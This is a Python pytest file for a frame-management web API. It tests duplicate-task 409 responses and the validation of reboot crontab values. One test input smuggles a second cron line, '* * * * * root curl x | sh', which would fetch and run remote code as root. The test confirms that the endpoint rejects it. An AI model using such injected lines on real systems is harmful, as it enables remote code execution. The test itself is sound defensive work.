import importlib

import pytest

from app.models.frame import new_frame
from app.tasks.utils import JobAlreadyQueuedError

tasks_package = importlib.import_module("app.tasks")


@pytest.mark.asyncio
@pytest.mark.parametrize("verb, task_name", [("deploy", "deploy_frame"), ("fast_deploy", "fast_deploy_frame")])
async def test_a_task_id_already_taken_answers_409_not_success(async_client, db, redis, monkeypatch, verb, task_name):
    frame = await new_frame(db, redis, "DupTaskFrame", "localhost", "localhost", project_id=async_client.project_id)

    async def already_queued(_id, _redis, **_kwargs):
        raise JobAlreadyQueuedError(f"A {task_name} job with id 'x' is already queued or ran recently")

    monkeypatch.setattr(tasks_package, task_name, already_queued)

    response = await async_client.post(f"/api/frames/{frame.id}/{verb}?task_id={verb}:{frame.id}:x")

    assert response.status_code == 409
    assert "already queued" in response.json()["detail"]


@pytest.mark.asyncio
async def test_frame_update_refuses_a_reboot_schedule_that_would_add_a_cron_line(async_client, db, redis):
    frame = await new_frame(db, redis, "CronFrame", "localhost", "localhost", project_id=async_client.project_id)

    bad = await async_client.post(
        f"/api/frames/{frame.id}",
        json={"reboot": {"enabled": "true", "crontab": "0 4 * * *\n* * * * * root curl x | sh"}},
    )
    assert bad.status_code == 400
    assert "single line" in bad.json()["detail"]

    good = await async_client.post(
        f"/api/frames/{frame.id}",
        json={"reboot": {"enabled": "true", "crontab": "30 4 * * *"}},
    )
    assert good.status_code == 200

    # A disabled schedule is not deployed, so it is not policed either.
    disabled = await async_client.post(
        f"/api/frames/{frame.id}",
        json={"reboot": {"enabled": "false", "crontab": "whatever"}},
    )
    assert disabled.status_code == 200
